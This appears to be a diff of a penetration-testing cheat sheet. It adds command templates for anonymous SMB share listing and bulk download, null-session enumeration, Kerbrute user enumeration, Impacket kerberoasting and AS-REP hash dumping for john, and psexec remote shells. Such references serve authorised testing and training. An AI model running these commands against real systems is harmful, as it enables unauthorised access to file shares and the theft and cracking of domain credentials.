@@ -13,17 +13,21 @@ sudo nmap -v -sS -sV -sC -T4 -p- -oA <output_file|nmap/tcp_full_scan> <ip>
 
 #plateform/linux #target/remote #cat/ATTACK/CONNECT
 
+## smbclient - list shares as anonymous user, just hit enter on password prompt
+```
+smbclient -L <ip>
+```
 ## smbclient - list shares
 ```
 smbclient -L //<ip> -U <user>
 ```
 
-## smbclient - connect to share
+## smbclient - connect to share, to download files set recurse on 'RECURSE ON' and disable prompt 'PROMPT OFF' then 'mget*' to download
 ```
-smbclient //<ip>/<sharename>
+smbclient //<ip>/<share>
 ```
 
-## smbmap - list shares
+## smbmap - list shares with no authentication
 ```
 smbmap -H <ip>
 ```
@@ -35,12 +39,36 @@ smbmap -u null -p "" -H <ip>
 
 ## smbmap - list all contents of share with no authentication
 ```
-smbmap -R <sharename> -H <ip>
+smbmap -R <share> -H <ip>
 ```
 
 ## smbmap - download specific file from share (might not save to local dir, updatedb, locate file)
 ```
-smbmap -R <sharename> -H <ip> -A '<file>' -q
+smbmap -R <share> -H <ip> -A '<file>' -q
+```
+
+## smbmap - download all files from share. Sometimes not all files are visible, connect via smbclient to confirm.
+```
+smbmap -R <share> -H <ip> -A '.' -q
+```
+
+# Crackmapexec
+% crackmapexec
+#plateform/linux #target/remote #cat/ATTACK/CONNECT
+
+## crackmapexec - check password policy with null authentication, only works against pre windows compatibility group (domains upgraded from 2003)
+```
+crackmapexec smb <ip> --pass-pol -u '' -p ''
+```
+
+# rpc
+% rpc
+
+#plateform/linux #target/remote #cat/ATTACK/CONNECT
+
+## rpcclient - null authentication
+```
+rpcclient -U '' <ip>
 ```
 
 # Mount
@@ -50,7 +78,7 @@ smbmap -R <sharename> -H <ip> -A '<file>' -q
 
 ## mount - mount share
 ```
-mount -t cifs -o username=<username>,password=<password> //<ip>/"<sharename>" <local_dir>
+mount -t cifs -o username=<user>,password=<password> //<ip>/"<share>" <local_dir>
 ```
 
 # semgrep
@@ -236,8 +264,26 @@ java -jar stegsolve.jar
 ```
 
 # Kerbrute
-## Kerbrute -  User Enumeration
+## Kerbrute -  user Enumeration
 ```
-/opt/kerbrute/dist/kerbrute_linux_amd64 userenum --dc <DC> -d <domain> <wordlist|User.txt>
+/opt/kerbrute/dist/kerbrute_linux_amd64 userenum --dc <DC> -d <domain> <wordlist|User.txt> -o <output_file>
 ```
 
+# Impacket
+## getuserspns - dump the Kerberos hash for all kerberoastable accounts it can find on the target domain 
+```
+python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py <domain>/<user>:<password> -dc-ip <ip> -request -outputfile <spn_filename> 
+```
+## getnpusers - obtain TGT tickets for users with user wordlist and output in format for john
+```
+python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -dc-ip <DC-IP> -usersfile <userlist_file> -outputfile <output_file|as_rep_hashes_john> -format john -no-pass <domain>/<ip>
+```
+## getnpusers - obtain TGT tickets for users and output in format for john
+```
+python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -dc-ip <dc-ip|ip> -outputfile as_rep_hashes_john -format john <domain>/
+```
+
+## psexec - with username 
+```
+python3 /usr/share/doc/python3-impacket/examples/psexec.py <domain>/<user>:<password>@<ip>
+```
